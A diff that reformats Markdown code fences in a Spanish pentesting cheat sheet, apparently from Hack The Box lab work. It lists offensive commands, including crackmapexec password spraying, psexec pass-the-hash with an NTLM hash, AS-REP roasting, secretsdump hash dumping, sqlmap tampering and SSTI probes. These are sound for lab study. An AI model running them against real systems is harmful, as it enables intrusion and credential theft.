@@ -60,30 +60,31 @@ grep -R -i passwd,password,db_passwd,db_pass
 export PATH=.:$PATH
 ```
 ### POWERVIEW
+```
 Import-Module .\PowerView.ps1 ----> Para activar el powerview si no el add-object/add-domain/get-domain no te funcionaran
 
-```
+
 ```
 ### FREEBSD
-
+```
 Sockstat --> ver puertos abiertos si linpeas no te lo reconoce
 ```
-```
-### ABRIR SERVER PARA DESCARGAR COSAS
 
+### ABRIR SERVER PARA DESCARGAR COSAS
+```
 python3 -m http.server 80
 python -m SimpleHTTPServer  80
 
 
-```
+
 ```
 ### TUNNEL SSH/PORTFORWARDING
-
+```
 El tunel sirve para cuando te encuentras un puerto abierto que este en localhost (solo se puede acceder desde la propia maquina victima, solo esta abierto para dentro) que necesite de interfaz grafica como vncviewer
 ssh -L 9999:127.0.0.1:5901 charix@10.10.10.84
 
 ssh -L puertoquequeremosaccederdesdemimaquina:127.0.0.1:puertodelservicio usuario@IP
-```
+
 ```
 ### CHISEL
 ```
@@ -99,10 +100,10 @@ sqlmap -r genres.request --second-req feed.request --batch --tamper=space2commen
 
 ```
 ### SSTI
-
+```
 ${{<%[%'"}}%\ probar estos caracteres si da error puede ser suscetible de ssti
 Si sabes que framework utiliza la web buscas el nombre del framework ssti si no lo sabes pruebas con la imagen del identify ---> https://portswigger.net/research/server-side-template-injection
-```
+
 
 ```
 ### SMB TRASNFER FILES
@@ -126,13 +127,14 @@ crackmapexec smb 10.10.10.169 -u ./users -p password --no-bruteforce ---> te com
 crackmapexec smb 10.10.10.169 -u ./users -p Welcome123! --no-bruteforce ---> te comprueba una lista de usuarios contra un passwd en concreto
 ```
 ### IMPACKET
+```
 impacket-psexec administrator@10.129.95.187 ---> te logea con administrador, te pide la pass luego
 impacket-psexec  administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ---> te logea cuando tienes un hash
 sudo impacket-smbserver share ./ ---> Te transfiere los archivos del directorio en el que te encuentres
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
 
 impacket-secretsdump htb/svc-alfresco@10.10.10.161 ---> te saca los hashes NTLM de todos los usuarios del dominio
-```
+
 ```
 ### NMAP
 ```
